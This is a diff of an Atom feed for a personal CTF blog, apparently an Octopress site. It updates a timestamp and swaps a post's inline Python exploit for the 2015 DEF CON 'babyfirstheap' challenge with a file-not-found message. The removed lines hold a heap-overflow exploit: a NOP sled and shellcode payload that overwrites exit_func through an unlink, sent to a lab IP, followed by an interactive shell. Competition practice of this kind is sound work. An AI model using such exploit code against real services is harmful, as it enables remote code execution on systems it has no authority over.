@@ -4,7 +4,7 @@
   <title><![CDATA[pwn_expoit Blog]]></title>
   <link href="http://mashirogod.github.io/atom.xml" rel="self"/>
   <link href="http://mashirogod.github.io/"/>
-  <updated>2015-11-15T04:30:22-08:00</updated>
+  <updated>2015-11-15T04:46:05-08:00</updated>
   <id>http://mashirogod.github.io/</id>
   <author>
     <name><![CDATA[pwn_expoit]]></name>
@@ -18,30 +18,7 @@
     <link href="http://mashirogod.github.io/blog/2015/11/15/2015-defcon-babyfirstheap/"/>
     <updated>2015-11-15T04:21:48-08:00</updated>
     <id>http://mashirogod.github.io/blog/2015/11/15/2015-defcon-babyfirstheap</id>
-    <content type="html"><![CDATA[<p>\&lsquo;from pwn_expoit import *
-import time
-a = 0.3
-def MakeCon():
-  MakeCon = remote(&ldquo;192.168.224.152&rdquo;,4444)
-  return MakeCon</p>
-
-<p>s = MakeCon()
-leak = s.recvuntil(&ldquo;[size=260]&rdquo;)[-18:-11]
-hex_addr = int(&ldquo;0x&rdquo;+leak,16)
-print hex_addr
-exit_func = 0x804c8ac
-dat  = &ldquo;&rdquo;
-dat += &ldquo;\xeb\x0c&rdquo;
-dat += nopsled(30)
-dat += shellcode(32)
-dat += &ldquo;A&rdquo;*(260-len(dat))
-dat += &ldquo;\x01\x00\x00\x00&rdquo;
-dat += p32(exit_func-0x8)
-dat += p32(hex_addr)
-time.sleep(a)
-s.send(dat+&ldquo;\n&rdquo;)
-s.interactive()
-\'</p>
+    <content type="html"><![CDATA[<p>File /home/pwn/Desktop/octopress/source/codeview/source/codeview/babyfirstheap.py could not be found</p>
 ]]></content>
   </entry>
   
